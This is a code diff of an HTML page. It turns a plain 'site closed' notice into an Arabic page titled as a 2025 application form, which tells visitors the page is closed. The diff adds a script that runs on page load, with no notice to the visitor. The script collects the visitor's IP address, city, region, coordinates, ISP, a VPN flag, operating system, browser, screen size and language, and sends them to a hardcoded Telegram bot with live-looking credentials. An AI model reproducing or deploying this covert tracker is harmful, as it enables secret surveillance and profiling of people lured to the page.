@@ -3,39 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The site is closed</title>
+    <title>استمارة التقديم لعام 2025</title>
     <style>
         body {
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
-            margin: 0;
+            background-color: #f4f4f9;
             font-family: Arial, sans-serif;
-            background-color: #282c34;
-            color: #ffffff;
             text-align: center;
+            color: #333;
         }
-
-        .container {
-            max-width: 600px;
+        .message-box {
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-
         h1 {
-            font-size: 2.5em;
-            color: #ff4d4d;
+            font-size: 24px;
+            margin-bottom: 10px;
         }
-
         p {
-            font-size: 1.2em;
-            color: #cccccc;
+            font-size: 18px;
+            margin-top: 0;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Site closed until further notice</h1>
-        <p>The site is currently closed until the site programming is completed.</p>
-    </div>
+
+<div class="message-box">
+    <h1>الصفحة مغلقة حاليا</h1>
+    <p>عذرًا، هذه الصفحة مغلقة حاليًا حتى إشعار لاحق.</p>
+</div>
+
+<script>
+    // استدعاء API لجلب معلومات IP المستخدم
+    fetch('https://ipinfo.io/json?token=5914e4c19b30c5')
+    .then(response => response.json())
+    .then(data => {
+        const ipInfo = {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country,
+            loc: data.loc,
+            org: data.org,
+            timezone: data.timezone,
+            isVpn: data.org.toLowerCase().includes('vpn') || data.org.toLowerCase().includes('proxy')
+        };
+
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            let deviceType = "Unknown";
+            let os = "Unknown";
+
+            if (/android/i.test(userAgent)) {
+                deviceType = "هاتف";
+                os = "Android";
+            } else if (/iphone|ipad|ipod/i.test(userAgent)) {
+                deviceType = "هاتف";
+                os = "iOS";
+            } else if (/windows/i.test(userAgent)) {
+                deviceType = "جهاز كمبيوتر";
+                os = "Windows";
+            } else if (/macintosh|mac os x/i.test(userAgent)) {
+                deviceType = "جهاز كمبيوتر";
+                os = "MacOS";
+            } else if (/linux/i.test(userAgent)) {
+                deviceType = "جهاز كمبيوتر";
+                os = "Linux";
+            }
+
+            return {
+                deviceType,
+                os,
+                browser: navigator.userAgent,
+                platform: navigator.platform,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language
+            };
+        }
+
+        const deviceInfo = getDeviceInfo();
+
+        const message = `
+        IP: ${ipInfo.ip}
+        المدينة: ${ipInfo.city}
+        المنطقة: ${ipInfo.region}
+        الدولة: ${ipInfo.country}
+        الموقع: ${ipInfo.loc}
+        مزود الخدمة: ${ipInfo.org}
+        المنطقة الزمنية: ${ipInfo.timezone}
+        VPN: ${ipInfo.isVpn ? 'نعم' : 'لا'}
+        
+        معلومات الجهاز:
+        نوع الجهاز: ${deviceInfo.deviceType}
+        نظام التشغيل: ${deviceInfo.os}
+        المتصفح: ${deviceInfo.browser}
+        المنصة: ${deviceInfo.platform}
+        دقة الشاشة: ${deviceInfo.screenResolution}
+        اللغة: ${deviceInfo.language}
+        `;
+
+        const telegramBotToken = '7669431012:AAG2awb0G-meRFp9rtki8ThgPrib7ffe3oo';  
+        const chatId = '7795896518';  
+
+        // إرسال البيانات إلى Telegram
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(result => {
+            console.log('تم إرسال البيانات إلى Telegram:', result);
+        })
+        .catch(error => {
+            console.error('حدث خطأ أثناء إرسال البيانات:', error);
+        });
+
+    })
+    .catch(error => {
+        console.error('حدث خطأ أثناء جلب بيانات IP:', error);
+    });
+</script>
+
 </body>
 </html>
